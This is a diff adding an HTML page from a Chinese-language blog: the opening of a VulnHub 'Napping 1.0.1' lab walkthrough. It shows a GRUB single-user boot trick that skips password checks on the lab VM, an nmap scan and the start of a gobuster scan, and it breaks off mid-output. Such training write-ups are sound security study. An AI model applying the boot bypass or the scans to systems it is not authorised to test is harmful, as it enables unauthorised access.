@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="一、修改靶机#1.1 修改启动参数进入单用户模式#启动靶机，在第一个界面加载完成，迅速单击shift进入GRUB菜单，接着e进入编辑模式，将ro（只读）修改为rw（读写），并参数末尾修改为single init=/bin/bash（直接启动到Bash环境，跳过密码验证），按Ctrl &#43; X启动
+1.2 修改网卡配置#输入ip a查看当前网卡名称，vim /etc/network/interfaces，将其中的名字修改为ens33，但若发现不存在该文件，这种情况是因为netplan软件接管了网卡管理，进入/etc/netplan文件夹，再进入00-netplan.yaml类似的配置文件，进入用i修改网络接口名称，再按Esc键，输入:wq保存退出
+二、信息搜集#2.1端口扫描#1┌──(kali㉿kali)-[~] 2└─$ sudo nmap -p- -A --min-rate 1000 192.168.203.132 3Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 02:01 EST 4Nmap scan report for 192.168.203.132 5Host is up (0.00038s latency). 6Not shown: 65533 closed tcp ports (reset) 7PORT STATE SERVICE VERSION 822/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 9| ssh-hostkey: 10| 3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA) 11| 256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA) 12|_ 256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519) 1380/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 14| http-cookie-flags: 15| /: 16| PHPSESSID: 17|_ httponly flag not set 18|_http-server-header: Apache/2.4.41 (Ubuntu) 19|_http-title: Login 20MAC Address: 00:0C:29:23:4A:EB (VMware) 21Device type: general purpose|router 22Running: Linux 4.X|5.X, MikroTik RouterOS 7.X 23OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 24OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) 25Network Distance: 1 hop 26Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 27 28TRACEROUTE 29HOP RTT ADDRESS 301 0.38 ms 192.168.203.132 31 32OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 33Nmap done: 1 IP address (1 host up) scanned in 24.24 seconds2.2HTTP扫描#2.3.1 gobuster#gobuster扫描无结果
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/vulnhub/vulnhub-Napping-1.0.1/">
+  <meta property="og:site_name" content="vnccer">
+  <meta property="og:title" content="vnccer">
+  <meta property="og:description" content="一、修改靶机#1.1 修改启动参数进入单用户模式#启动靶机，在第一个界面加载完成，迅速单击shift进入GRUB菜单，接着e进入编辑模式，将ro（只读）修改为rw（读写），并参数末尾修改为single init=/bin/bash（直接启动到Bash环境，跳过密码验证），按Ctrl &#43; X启动
+1.2 修改网卡配置#输入ip a查看当前网卡名称，vim /etc/network/interfaces，将其中的名字修改为ens33，但若发现不存在该文件，这种情况是因为netplan软件接管了网卡管理，进入/etc/netplan文件夹，再进入00-netplan.yaml类似的配置文件，进入用i修改网络接口名称，再按Esc键，输入:wq保存退出
+二、信息搜集#2.1端口扫描#1┌──(kali㉿kali)-[~] 2└─$ sudo nmap -p- -A --min-rate 1000 192.168.203.132 3Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 02:01 EST 4Nmap scan report for 192.168.203.132 5Host is up (0.00038s latency). 6Not shown: 65533 closed tcp ports (reset) 7PORT STATE SERVICE VERSION 822/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 9| ssh-hostkey: 10| 3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA) 11| 256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA) 12|_ 256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519) 1380/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 14| http-cookie-flags: 15| /: 16| PHPSESSID: 17|_ httponly flag not set 18|_http-server-header: Apache/2.4.41 (Ubuntu) 19|_http-title: Login 20MAC Address: 00:0C:29:23:4A:EB (VMware) 21Device type: general purpose|router 22Running: Linux 4.X|5.X, MikroTik RouterOS 7.X 23OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 24OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) 25Network Distance: 1 hop 26Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 27 28TRACEROUTE 29HOP RTT ADDRESS 301 0.38 ms 192.168.203.132 31 32OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 33Nmap done: 1 IP address (1 host up) scanned in 24.24 seconds2.2HTTP扫描#2.3.1 gobuster#gobuster扫描无结果">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+
+
+  <meta itemprop="name" content="vnccer">
+  <meta itemprop="description" content="一、修改靶机#1.1 修改启动参数进入单用户模式#启动靶机，在第一个界面加载完成，迅速单击shift进入GRUB菜单，接着e进入编辑模式，将ro（只读）修改为rw（读写），并参数末尾修改为single init=/bin/bash（直接启动到Bash环境，跳过密码验证），按Ctrl &#43; X启动
+1.2 修改网卡配置#输入ip a查看当前网卡名称，vim /etc/network/interfaces，将其中的名字修改为ens33，但若发现不存在该文件，这种情况是因为netplan软件接管了网卡管理，进入/etc/netplan文件夹，再进入00-netplan.yaml类似的配置文件，进入用i修改网络接口名称，再按Esc键，输入:wq保存退出
+二、信息搜集#2.1端口扫描#1┌──(kali㉿kali)-[~] 2└─$ sudo nmap -p- -A --min-rate 1000 192.168.203.132 3Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 02:01 EST 4Nmap scan report for 192.168.203.132 5Host is up (0.00038s latency). 6Not shown: 65533 closed tcp ports (reset) 7PORT STATE SERVICE VERSION 822/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 9| ssh-hostkey: 10| 3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA) 11| 256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA) 12|_ 256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519) 1380/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 14| http-cookie-flags: 15| /: 16| PHPSESSID: 17|_ httponly flag not set 18|_http-server-header: Apache/2.4.41 (Ubuntu) 19|_http-title: Login 20MAC Address: 00:0C:29:23:4A:EB (VMware) 21Device type: general purpose|router 22Running: Linux 4.X|5.X, MikroTik RouterOS 7.X 23OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 24OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) 25Network Distance: 1 hop 26Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 27 28TRACEROUTE 29HOP RTT ADDRESS 301 0.38 ms 192.168.203.132 31 32OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 33Nmap done: 1 IP address (1 host up) scanned in 24.24 seconds2.2HTTP扫描#2.3.1 gobuster#gobuster扫描无结果">
+  <meta itemprop="wordCount" content="960">
+
+<title>Vulnhub Napping 1.0.1 | vnccer</title>
+<link rel="icon" href="/AK47.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/vulnhub/vulnhub-Napping-1.0.1/">
+<link rel="stylesheet" href="/book.min.3eb8e617dc32e7c70636bb34fa5457217c8230c542739203881f3180a2c91dbb.css" integrity="sha256-PrjmF9wy58cGNrs0&#43;lRXIXyCMMVCc5IDiB8xgKLJHbs=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/zh.search.min.b88b63abdc4875cf9836687c3b1bfc55871fdbe5b3e233502588259d902a5b81.js" integrity="sha256-uItjq9xIdc&#43;YNmh8Oxv8VYcf2&#43;Wz4jNQJYglnZAqW4E=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="搜索"
+    aria-label="搜索"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      🛡️网安</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d5df1c89b3beb5d08d89138670fc5f81" class="toggle" checked />
+    <label for="section-d5df1c89b3beb5d08d89138670fc5f81" class="flex">
+      <a role="button" class="">
+        Vulnhub</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-bfe4bf07ad333338fadcf4204b272d0e" class="toggle"  />
+    <label for="section-bfe4bf07ad333338fadcf4204b272d0e" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b3c7140b1d41ab832458c80758cef6c9" class="toggle"  />
+    <label for="section-b3c7140b1d41ab832458c80758cef6c9" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-199c80af73916a8116f7ec58495f5b3f" class="toggle"  />
+    <label for="section-199c80af73916a8116f7ec58495f5b3f" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/vulnhub-Napping-1.0.1/" class="active">
+      Vulnhub Napping 1.0.1</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      Ctf</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      📄论文</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      💼未来</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      🤖AI</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      🛠️技能</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a>
+      ☕生活</a>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+<ul><li><a href="/posts/" title="Blog">Blog</a></li></ul>
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Vulnhub Napping 1.0.1</h3>
+
+  <label for="toc-control">
+    
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="一修改靶机">一、修改靶机<a class="anchor" href="#%e4%b8%80%e4%bf%ae%e6%94%b9%e9%9d%b6%e6%9c%ba">#</a></h1>
+<h2 id="11-修改启动参数进入单用户模式">1.1 修改启动参数进入单用户模式<a class="anchor" href="#11-%e4%bf%ae%e6%94%b9%e5%90%af%e5%8a%a8%e5%8f%82%e6%95%b0%e8%bf%9b%e5%85%a5%e5%8d%95%e7%94%a8%e6%88%b7%e6%a8%a1%e5%bc%8f">#</a></h2>
+<p>启动靶机，在第一个界面加载完成，迅速单击<code>shift</code>进入GRUB菜单，接着<code>e</code>进入编辑模式，将<code>ro</code>（只读）修改为<code>rw</code>（读写），并参数末尾修改为<code>single init=/bin/bash</code>（直接启动到Bash环境，跳过密码验证），按<code>Ctrl + X</code>启动</p>
+<h2 id="12-修改网卡配置">1.2 修改网卡配置<a class="anchor" href="#12-%e4%bf%ae%e6%94%b9%e7%bd%91%e5%8d%a1%e9%85%8d%e7%bd%ae">#</a></h2>
+<p>输入<code>ip a</code>查看当前网卡名称，<code>vim /etc/network/interfaces</code>，将其中的名字修改为<code>ens33</code>，但若发现不存在该文件，这种情况是因为<code>netplan</code>软件接管了网卡管理，进入<code>/etc/netplan</code>文件夹，再进入<code>00-netplan.yaml</code>类似的配置文件，进入用<code>i</code>修改网络接口名称，再按<code>Esc</code>键，输入<code>:wq</code>保存退出</p>
+<h1 id="二信息搜集">二、信息搜集<a class="anchor" href="#%e4%ba%8c%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86">#</a></h1>
+<h2 id="21端口扫描">2.1端口扫描<a class="anchor" href="#21%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ sudo nmap -p- -A --min-rate <span style="color:#a5d6ff">1000</span> 192.168.203.132
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>Starting Nmap 7.95 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-03-04 02:01 EST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>Nmap scan report <span style="color:#ff7b72">for</span> 192.168.203.132
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.00038s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>Not shown: <span style="color:#a5d6ff">65533</span> closed tcp ports <span style="color:#ff7b72;font-weight:bold">(</span>reset<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>|   <span style="color:#a5d6ff">3072</span> 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 <span style="color:#ff7b72;font-weight:bold">(</span>RSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>|   <span style="color:#a5d6ff">256</span> 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be <span style="color:#ff7b72;font-weight:bold">(</span>ECDSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>|_  <span style="color:#a5d6ff">256</span> af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b <span style="color:#ff7b72;font-weight:bold">(</span>ED25519<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>80/tcp open  http    Apache httpd 2.4.41 <span style="color:#ff7b72;font-weight:bold">((</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>| http-cookie-flags: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>|   /: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span>|     PHPSESSID: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span>|_      httponly flag not set
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>|_http-server-header: Apache/2.4.41 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>|_http-title: Login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span>MAC Address: 00:0C:29:23:4A:EB <span style="color:#ff7b72;font-weight:bold">(</span>VMware<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span>Device type: general purpose|router
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span>Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span>OS details: Linux 4.15 - 5.19, OpenWrt 21.02 <span style="color:#ff7b72;font-weight:bold">(</span>Linux 5.4<span style="color:#ff7b72;font-weight:bold">)</span>, MikroTik RouterOS 7.2 - 7.5 <span style="color:#ff7b72;font-weight:bold">(</span>Linux 5.6.3<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">25</span><span>Network Distance: <span style="color:#a5d6ff">1</span> hop
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">26</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">27</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">28</span><span>TRACEROUTE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">29</span><span>HOP RTT     ADDRESS
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">30</span><span><span style="color:#a5d6ff">1</span>   0.38 ms 192.168.203.132
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">31</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">32</span><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">33</span><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 24.24 seconds</span></span></code></pre></div><h2 id="22http扫描">2.2HTTP扫描<a class="anchor" href="#22http%e6%89%ab%e6%8f%8f">#</a></h2>
+<h3 id="231-gobuster">2.3.1 gobuster<a class="anchor" href="#231-gobuster">#</a></h3>
+<p>gobuster扫描无结果</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>/usr/share/wordlists<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ gobuster dir -u http://192.168.203.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>Gobuster v3.8
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>by OJ Reeves <span style="color:#ff7b72;font-weight:bold">(</span>@TheColonial<span style="color:#ff7b72;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#ff7b72;font-weight:bold">(</span>@firefart<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Url:                     http://192.168.203.132
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Threads:                 <span style="color:#a5d6ff">10</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Negative Status codes:   <span style="color:#a5d6ff">404</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> User Agent:              gobuster/3.8
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Timeout:                 <span style="color:#79c0ff">10s</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
